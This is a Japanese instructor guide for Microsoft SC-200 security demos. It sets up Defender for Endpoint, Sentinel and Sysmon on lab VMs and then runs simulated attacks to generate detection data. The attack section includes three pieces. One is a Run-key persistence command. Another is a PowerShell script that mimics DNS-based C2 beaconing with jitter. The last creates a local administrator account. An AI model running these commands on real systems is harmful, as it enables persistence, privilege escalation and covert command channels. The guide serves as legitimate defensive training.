
# Microsoft セキュリティ オペレーション アナリスト
講師用準備ガイド

## 目的 

このドキュメントは、「セキュリティを最新化し、脅威から身を守る」 ための Microsoft セキュリティ仮想トレーニングデーを教える準備をしているプレゼンターを対象としています。この資料は SC-200: Microsoft Security Operations Analyst 認定コースのサブセットです。

## デモの前提条件

このコースのラボでは、Microsoft 365 E5 ライセンスのテナントと、Azure サブスクリプションの両方が必要です。
* ご自身のために Microsoft Learning Azure Pass を要求できます
* デモを実行する少なくとも 2 週間前に、これらのパスを要求してください。パスを受け取った後、そのパスを有効にする必要があります。 
* Azure Pass は、一般に公開されている Microsoft Azure 試用版サブスクリプションと同じ方法で、効果的に機能します。これは、パスで実行できる操作に制限があることを意味します。
* ラボの手順は、[SC-200 Microsoft Learning Github](https://github.com/MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst/tree/master/Instructions/VTD_Demos/) リポジトリにあります。
* デモに使用するコンピューターに新しい Microsoft Edge ブラウザーがインストールされていることを確認してください。

## Activate Azure Pass

## Defender for Endpoint のデプロイ

### Microsoft 365 資格情報の取得

ラボを起動すると、無料のトライアル テナントを利用して Microsoft Virtual Lab 環境にアクセスできるようになります。このテナントには自動的に一意のユーザー名とパスワードが割り当てられます。Microsoft Virtual Lab 環境で Azure と Microsoft 365 にサインインするには、このユーザー名とパスワードを取得する必要があります。 

このコースは、学習パートナーが複数の認証済みラボ ホスティング プロバイダーのいずれかを使用して実施することもあり、お使いになっているテナントに関連のあるテナント ID を取得する実際の手順はラボ ホスティング プロバイダーに応じて異なります。このため、コース内での当該情報の取得方法については、講師が必要な指示を行います。後ほど使用できるよう以下の情報に留意してください。

	- **テナント サフィックス ID**: この ID は、ラボ全体で Microsoft 365 にサインインする際に使用する onmicrosoft.com アカウント用です。形式は **{username}@M365xZZZZZZ.onmicrosoft.com** です。ZZZZZZ はラボ ホスティング プロバイダーの提供した一意のテナント サフィックス ID です。後で使用できるよう、この ZZZZZZ を記録しておきます。ラボの手順で Microsoft 365 ポータルにサインインするよう指示されたら、ここで取得した ZZZZZZ の値を入力してください。
	- **テナント パスワード**: これは、ラボ ホスティング プロバイダーの提供する管理者アカウント向けのパスワードです。
	

### Microsoft Defender for Endpoint の初期化

このタスクでは、Microsoft Defender for Endpoint ポータルの初期化を行います。


1.  管理者として WIN1 仮想マシンにログインします。パスワードは **Pa55w.rd**。  

2.  Microsoft Edge ブラウザーを開いて「edge ブラウザー更新」を検索し、新しい Microsoft Edge ブラウザーをダウンロードしてインストールします。この手順は、ホスティングされている仮想マシンで確実に Microsoft Edge の最新版を実行する上で重要です。新しい Edge ブラウザーを起動します。

3.  Edge ブラウザーで Microsoft Defender セキュリティ センターに進みます (https://securitycenter.microsoft.com)。

4. **サインイン** ダイアログ ボックスで、ラボ ホスティング プロバイダーの提供した管理者ユーザー名のテナント電子メール アカウントをコピーして貼り付け、「**次へ**」 を選択します。

5. **パスワードの入力** ダイアログ ボックスで、ラボ ホスティング プロバイダーの提供した管理者のテナント パスワードをコピーして貼り付け、**サインイン** します。

**注**: 「このセクションにアクセスできません」というメッセージが表示されたら、5 分待ってから再びお試しください。  アクセス ルールでテナントを広める必要があるかもしれません。  

6. **Microsoft セキュリティ センター** セットアップのステップ 2 で 「**次へ**」 を選択します。

7. ステップ 3 「**基本設定のセットアップ**」で、このトレーニング テナントの管理に適したデータ ストレージの場所を選択します。  コースの講師と確認した方がよいかもしれません。

8. プレビュー機能が **オン** になっていることを確認してください。

9. 「**次へ**」を選択します。  

10. **クラウド インスタンスの作成** で 「続行」 を選択します。

11. **Microsoft Defender for Endpoint アカウントの作成中**の進行状況バーが完了すると、ステップ 4 のオプションが表示されます。  **Microsoft Defender for Endpoint を使用して開始**を選択します。

12. 「セットアップ未完了」ダイアログ ボックスで 「**このまま続行する**」 を選択します。

**注**: セットアップは**完了**します。  次のタスクではデバイスのオンボードを行います。  

### デバイスのオンボード

このタスクでは、デバイスを Microsoft Defender for Endpoint にオンボードします。

1. https://securitycenter.microsoft.com で Microsoft Defender セキュリティ センターに進みます。現在ポータルを使用していない場合は、**テナン電子メール**の資格情報を使用してログインします。

2. 左側のメニュー バーで **「設定」** を選択します。

3. デバイス管理セクションで **「オンボーディング」** を選択します。

4. デバイスのオンボード エリアで 「**パッケージのダウンロード**」 ボタンを選択します。

5. ダウンロードされた zip ファイルをローカル フォルダーに抽出します (［ドキュメント］ フォルダーなど)。

6. 抽出されたファイル (WindowsDefenderATPLocalOnboardingScript.cmd) を右クリックし「**管理者として実行**」 を選択します。  Windows SmartScreen が表示されたら「実行」 を選択します。

**注** 既定で、ファイルは 「c:\users\admin\downloads」 ディレクトリにあります。
    
7. スクリプトの質問に対して 「**Y**」 と回答します。完了したら、コマンド画面に「マシンのオンボードに成功しました」といった内容のメッセージが表示されます。 

8. ポータルの 「オンボーディング」 ページで、検出テスト スクリプトをコピーしてオープン コマンド　ウィンドウで実行します。  新しい **管理者: コマンド プロンプト** ウィンドウを開く必要があるかもしれません。Windows 検索バーで「*CMD*」と入力し、「**管理者として実行**」 を選択します。

9. Microsoft Defender セキュリティ センターのポータル メニューで 「**デバイスのインベントリ**」 を選択します。お使いになっているデバイスがリストに表示されます。

**注** デバイスがポータルに表示されるまでに最高 5 分かかることがあります。


### ロールの構成

このタスクでは、デバイス グループで使用するロールを設定します。

1. Microsoft Defender セキュリティ センターのポータルで左側のメニュー バーから 「**設定**」 を選択します。 

2. アクセス許可エリアで 「**ロール**」 を選択します。

3. 「**ロールをオンにする**」 ボタンを選択します。

4. 「**項目の追加**」 を選択します。

5. ロールの追加 ダイアログで以下を入力します。
    ロール名: レベル
    ライブ応答機能: チェックボックスを選択します
    詳細: 選択します。

6. 「**次へ**」を選択します。

7. 割り当て済みユーザー グループ　タブで「**sg-IT**」 を選び、「**選択したグループを追加**」 を選択します。

8. 「**保存**」を選択します。


### デバイス グループの構成

このタスクでは、アクセス コントロールと自動化の設定が可能なデバイス グループを構成します。

1. 左側のメニュー バーで **「設定」** を選択します。 

2. アクセス許可エリアで 「**デバイス グループ**」 を選択します。

3. 「**デバイス グループの追加**」 を選択します。

4. 全般 タブに次の情報を入力します。

- デバイス グループ名: Regular
- 自動化レベル: Full - remediate threats automatically (完全 - 脅威を自動的に修復する)
- メンバー: 名前は TESTLAB と同じになります

5. 「**次へ**」を選択します。

6. ユーザー アクセス タブで 「**sg-IT**」 を選び、「**選択したグループを追加**」 を選択します。

7. **「完了」** を選択します。

8. これでデバイス グループの構成が変わりました。変更を適用して一致を確認し、グループ化を再計算します。


## モジュール　2　でデモのサンプル　アラートをデプロイする

このタスクでは、サンプルのセキュリティアラートを読み込み、アラートの詳細を確認します。

2. Edgeブラウザーで Azure portal を開きます　https://portal.azure.com。

3. **サインイン** ダイアログ ボックスで、ラボ ホスティング プロバイダーから提供された**テナントの電子メール**アカウントをコピーして貼り付け、「**次へ**」を選択します。

4. **パスワードの入力**ダイアログ ボックスで、ラボ ホスティング プロバイダーから提供された**テナントパスワード**をコピーして貼り付け、**「サインイン」** を選択します。

5. Azureポータルの検索バーに *セキュリティ*を入力し **セキュリティセンター**を選択します。

1. セキュリティ　センターのアップグレードを求めるメッセージが表示されたら、下部にある「**スキップ**」をクリックします。

6. ポータルメニューで「**セキュリティアラート**」を選択します。

7. コマンド バーから 「**サンプルアラート**」を選択します。

8. サンプルアラートの作成（プレビュー）ペインで、サブスクリプションが選択されていることを確認します。  すべてのサンプルアラートが選択されていることを確認し、「**サンプルアラートの作成**」を選択します。  

**注**: これは完了するまでに数分かかる場合があります。

## モジュール　4　でデモ用の Azure Sentinel ワークスペースをデプロイする

このタスクでは、Azure Sentinel ワークスペースを作成します。

3.  Edge　ブラウザーで Azure portal (https://portal.azure.com) に移動します。

4. **サインイン** ダイアログ ボックスで、ラボ ホスティング プロバイダーから提供された**テナントの電子メール**アカウントをコピーして貼り付け、「**次へ**」を選択します。

5. **パスワードの入力**ダイアログ ボックスで、ラボ ホスティング プロバイダーから提供された**テナントパスワード**をコピーして貼り付け、**「サインイン」** を選択します。

6. Azureポータルの検索バーに「*Sentinel*」と入力し、「**Azure Sentinel**」を選択します。

7. 「**+ 作成**」を選択します。

8. 「**+ 新しいワークスペースの作成**」を選択します。

**注** まず、新しい Log Analytics ワークスペースを作成します。

9. 適切なサブスクリプションを選択します。

10. リソースグループの**新規作成** リンクを選択し、選択した新しいリソースグループ名を入力します。

11. 名前 フィールドの インスタンスの詳細 で、Log Analytics ワークスペースに選択する名前を入力します。

**注:** この名前は、Azure Sentinel ワークスペース名にもなります。

12. 適切な領域を選択します。  適切な領域が既定になる場合や、インストラクターがどの領域を選択するかについて具体的なアドバイスをする場合があります。  

13. [**Review + create**] を選択します。

14. 「**作成**」を選択します。新しい Log Analytics ワークスペースが Azure Sentinel をワークスペースに追加ページのリストに表示されるのを待ちます。  これには時間がかかることがあります。

16. 新しく作成されたワークスペースが表示されたらそれを選択し、「**追加**」を選択します。

## Azure Sentinel のデータ コネクタを作成する

### タスク 1: Azure Sentinel ワークスペースにアクセスします。

このタスクでは、Azure Sentinel ワークスペースにアクセスします。

1. 管理者として WIN1 仮想マシンにログインします。パスワードは **Pa55w.rd**。  

2. ブラウザを開き、新しい Microsoft Edge ブラウザーを検索、ダウンロード、およびインストールします。新しい Edge ブラウザーを起動します。

3. Edge　ブラウザーで Azure portal (https://portal.azure.com) に移動します。

4. **サインイン** ダイアログ ボックスで、ラボ ホスティング プロバイダーから提供された**テナントの電子メール**アカウントをコピーして貼り付け、「**次へ**」を選択します。

5. **パスワードの入力**ダイアログ ボックスで、ラボ ホスティング プロバイダーから提供された**テナントパスワード**をコピーして貼り付け、**「サインイン」** を選択します。

6. Azureポータルの検索バーに「*Sentinel*」と入力し、「**Azure Sentinel**」を選択します。

7. 前のラボで作成した Azure Sentinel ワークスペースを選択します。

### タスク 2: Azure Active Directory コネクタを接続する

このタスクでは、Azure アクティビティ データ コネクタを接続します。

1. 構成領域で、 「**データコネクタ**」を選択します。  データ コネクタ ページで、リストから **Azure Active Directory** タイルを選択します。

2. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

3. 構成領域から「**サインインログ**」および「**監査ログ**」オプションを選択し、「**変更の適用**」を選択します。

### タスク 3: Azure Active Directory Identity Protection コネクタを接続する

このタスクでは、Azure Active Directory Identity Protection コネクタを接続します。

1. データ コネクタ タブで、リストから「**Azure Active Directory Identity Protection**」コネクタを選択します。

2. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

3. 「**接続**」ボタンを選択します。

### タスク 4: Azure Directory コネクタを接続する

このタスクでは、Azure Directory コネクタを接続します。

1. データ コネクタ タブで、リストから「**Azure Defender**」コネクタを選択します。

2. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

3. 接続オプションを確認します。接続しない。これは情報提供のみを目的としています。

### タスク 5: Microsoft Cloud AppSecurityコネクタを接続する。

このタスクでは、Microsoft Cloud App Security コネクタをには接続しません。

1. データ コネクタ タブで、リストから「**Microsoft Cloud App Security**」コネクタを選択します。

2. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

3. 「**アラート**」 を選択し、「**変更の適用**」 を選択します。

### タスク 6: Microsoft Defender for Office 365 に接続する

このタスクでは、Microsoft Defender for Office 365 コネクタを接続します。

1. データ コネクタ タブで、リストから「**Microsoft Defender for Office 365**」コネクタを選択します。

2. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

3. [**接続**] を選択します。

### タスク 7: Microsoft Defender for forIdentity コネクタに接続する

このタスクでは、Microsoft Defender for Identity コネクタを接続します。

1. データ コネクタ タブで、リストから「**Microsoft Defender for Identity**」コネクタを選択します。

2. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

3. 接続オプションを確認します。接続しない。これは情報提供のみを目的としています。

### タスク 8: Microsoft Defender for Endpointコネクタに接続する

このタスクでは、Microsoft Defender for Endpoint コネクタを接続します。

1. データ コネクタ タブで、リストから「**Microsoft Defender for Endpoint**」コネクタを選択します。

2. コネクタ情報ブレードで「コネクタページを開く」を選択します。

3. [**接続**] を選択します。

### タスク 9: Microsoft 365 Defender コネクタを接続する

このタスクでは、Microsoft 365 Defender コネクタを接続します。

1. データ コネクタ タブで、リストから「**Microsoft 365 Defender**」コネクタを選択します。

2. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

3. Microsoft Defender for Endpoint のすべてのチェックボックスを選択します。

4. **「変更の適用」** を選択します。

### タスク 3: 非 Azure Windows 機械の接続

このタスクでは、非 Azure Windows 仮想マシンを Azure Sentinel に接続します。

1. 管理者として WIN2 仮想マシンにログインします。パスワードは **Pa55w.rd**。  

2. ブラウザを開き、新しい Microsoft Edge ブラウザーを検索、ダウンロード、およびインストールします。新しい Edge ブラウザーを起動します。

3. ブラウザーを開き、資格情報を使用して https://portal.azure.com の Azure ポータルにログインします。

4. Azure ポータルの検索バーに 「*Sentinel*」と入力し、「**Azure Sentinel**」を選択します。

5. Azure Sentinel ワークスペースを選択します。

6. データ コネクタ タブで、リストから「**セキュリティ イベント** 」コネクタを選択します。

7. コネクタ情報ブレードで「**コネクタページを開く**」を選択します。

8. ストリーミングするイベントの選択領域で、「**すべてのイベント**」を選択し、「**変更の適用**」を選択します。

9. 「**非 Azure Windows 仮想マシンにインストールエージェント**」を選択します。

**注:** Windows 仮想マシンへのエージェントのインストールと非 Azure　Windows マシンへのエージェントのインストールの手順が逆になる場合があります。リンクは、テキストが逆になっている場合でも、適切な場所に移動します。

10. 「**非 Azure Windows 仮想マシンのエージェントのダウンロードとインストール**」を選択します。 

11. **Windows エージェントのダウンロード（64 ビット）** のリンクを選択します。

12. ダウンロードした .exe ファイルを実行し、確認と表示される可能性のあるユーザーアカウント制御プロンプトを実行します。

13. ウェルカムダイアログで「**次へ**」を選択します。

14. マイクロソフトソフトウェアライセンス条項ページで「**同意する**」を選択します。  宛先プロンプトで、「**次へ**」を選択します。

15. エージェントのセットアップ オプションプロンプトで、「**エージェントを Azure Log Analytics （OMS）**」 に接続するオプションを選択し、「**次へ**」を選択します。

16. ブラウザで、エージェントの管理ページから**ワークスペースID** をコピーし、ダイアログのワークスペース ID に貼り付けます。 

17. ブラウザで、エージェントの管理ページから主キーをコピーし、ダイアログの**主キー**に貼り付けます。 

18. 「**次へ**」を選択します。

19. Microsoft Update ページで「**次へ**」を選択します。

20. 次に、「**インストール**」を選択します。

### タスク 4: Sysmon ログをインストールして収集します。

このタスクでは、Sysmon ログをインストールして収集します。

引き続き WIN2 仮想マシンに接続する必要があります。  次の手順では、既定構成で Sysmon をインストールします。.  実稼働マシンで使用する Sysmon のコミュニティベースの構成を調査する必要があります

1. ブラウザーで、次のログイン URL に移動します。https://docs.microsoft.com/sysinternals/downloads/sysmon

2. **Sysmon のダウンロード**を選択して、ページから Sysmon をダウンロードします。

3. ダウンロードしたファイルを開き、ファイルを新しいディレクトリ c:\sysmon に抽出します。

4. Windows の WIN2 タスクバーの検索ボックスに*コマンド*を入力します。  検索結果には、コマンドプロンプトアプリが表示されます。  コマンドプロンプトアプリを右クリックし、**管理者として実行**を選択します。  表示されるユーザーアカウント制御のプロンプトを確認します。

5. *cd \sysmon* と入力する。

6. type *notepad sysmon.xml* と入力して、新しいファイルを作成します。

7. Open a tab in the browser and navigate to: https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml

8. そのファイルの内容を Github から作成した sysmon.xml メモ帳ファイルにコピーしてファイルを保存します。

9. コマンドプロンプトで次のように入力し、Enter キーを押します。
    sysmon.exe -accepteula -i sysmon.xml

10. ブラウザで、https://portal.azure.com の Azure ポータルに移動します 

11. Azure ポータルの検索バーに「*Sentinel*」と入力し、「**Azure Sentinel**」を選択します。

12. Azure Sentinel で、構成領域から「**設定**」を選択し、「**ワークスペース設定**」タブを選択します

13. Azure Sentinel ワークスペースが選択されていることを確認してください。

14. 設定で「**エージェントの構成**」を選択します

15. 「**Windows イベントログ**」タブを選択します。

16. 「**Windows イベントログの追加**」ボタンを選択します。

17. ログ名フィールドに 「**Microsoft-Windows-Sysmon/Operational**」 と入力します。

18. 「**適用**」を選択します。

## 攻撃の実施

### タスク 1: Defender for Endpoint によって構成したWindowsを攻撃します。

このタスクでは、Microsoft Defender for Endpoint が構成されているホストに対して攻撃を実行します。

1. 管理者として WIN1 仮想マシンにログインします。パスワードは **Pa55w.rd**。  

2. タスクバーの検索で、*Command* と入力します。  検索結果にコマンドプロンプトが表示されます。  コマンドプロンプトを右クリックして、**管理者として実行**を選択します。表示されるユーザーアカウント制御のプロンプトを確認します。

3. コマンドプロンプトで、各行の後にEnterキーを押して、各行にコマンドを入力します。
```
cd \
mkdir temp
cd temp
```
4. 攻撃 1 - 次のコマンドをコピーして実行します。

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

5. 攻撃 3 - 次のコマンドをコピーして実行します。

```
notepad c2.ps1
```
**はい**を選択して新しいファイルを作成し、以下の PowerShell スクリプトを c2.ps1 にコピーして**保存**を選択します。

**注**仮想マシンへの貼り付けには長さの制限がある場合があります。  これを3つのセクションに貼り付けて、すべてのスクリプトが仮想マシンに貼り付けられるようにします。  スクリプトがメモ帳 c2.ps1 ファイル内のこれらの手順のように見えることを確認してください。

```


param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)


$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)

$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        
        $x2 = 1

    }
    else
    {
        $x2 = $x2 + 1
    }
    
    if ($x3 -eq 7 )
    {

        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

        $x3 = 1
        
    }
    else
    {
        $x3 = $x3 + 1
    }


    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)

```

コマンドプロンプトで、次のように入力し、各行の後に Enter キーを押して各行にコマンドを入力します。
```
powershell
.\c2.ps1
```
**注:** 解決エラーが表示されます。これは予想されることです。
このコマンド/パワーシェルスクリプトをバックグラウンドで実行します。ウィンドウを閉じないでください。  コマンドは、数時間ログエントリを生成する必要があります。  このスクリプトの実行中に次のタスクや次の演習に進むことができます。  このタスクで作成したデータは、後で脅威の捜索ラボで使用します。  このプロセスでは、大量のデータや処理を作成することはありません。

### タスク 2: Sysmon で構成された攻撃ウィンドウ

このタスクでは、セキュリティイベントコネクタが構成され、Sysmon が構成されているホストに対して攻撃を実行します。

1. 管理者として WIN2 仮想マシンにログインします。パスワードは **Pa55w.rd**。  

2. タスクバーの検索で、*CMD* と入力します。  検索結果にコマンドプロンプトが表示されます。  コマンドプロンプトを右クリックして、**管理者として実行**を選択します。

3. コマンドプロンプトで、各行の後に Enter キーを押して、各行にコマンドを入力します。
```
cd \
mkdir temp
cd \temp
```

4. 攻撃 1 - 次のコマンドをコピーして実行します。

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

5. 攻撃 2 - このコマンドをコピーして実行し、各行の後に Enter キーを押して各行にコマンドを入力します。

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```